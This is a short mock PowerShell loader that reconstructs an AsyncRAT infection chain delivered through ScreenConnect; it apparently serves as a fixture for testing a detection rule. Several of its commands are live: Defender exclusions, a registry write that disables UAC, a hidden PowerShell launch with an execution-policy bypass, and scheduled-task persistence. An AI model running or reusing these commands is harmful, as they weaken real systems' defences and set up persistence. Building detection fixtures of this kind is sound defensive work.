# Mock ScreenConnect->AsyncRAT PowerShell loader (Skype.ps1) — reconstructed
# from Kaspersky + Hunt.io analysis. Tests AsyncRAT_ScreenConnect_SEO_Behavior.
# NOT functional malware — indicators are inert and for detection testing only.

# Deployed by the side-loaded install.res.1033.dll via the ScreenConnect client
$implant = "screenconnect.client.exe"

# Defense evasion: exclude staging dir from Defender, disable UAC
Add-MpPreference -ExclusionPath "C:\ProgramData\svc" -ExclusionExtension ".idk"
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0

# AMSI bypass staged from pe.txt before loading the RAT
$amsi = "AmsiScanBuffer"

# Native injector loads AsyncRAT build "FlowProxy Monitor V3" into AppLaunch.exe
$injector = "libPK.dll"   # exports Execute
$target   = "AppLaunch.exe"
$build    = "FlowProxy Monitor V3"

# Re-launch next stage hidden with execution-policy bypass
Start-Process powershell -ArgumentList "-w hidden -ep bypass -File Skype.ps1"

# Persistence
schtasks /create /tn "SystemInstallTask" /sc minute /mo 10 /tr "wscript Ab.vbs"
schtasks /create /tn "3losh" /sc minute /mo 2 /tr "$injector"
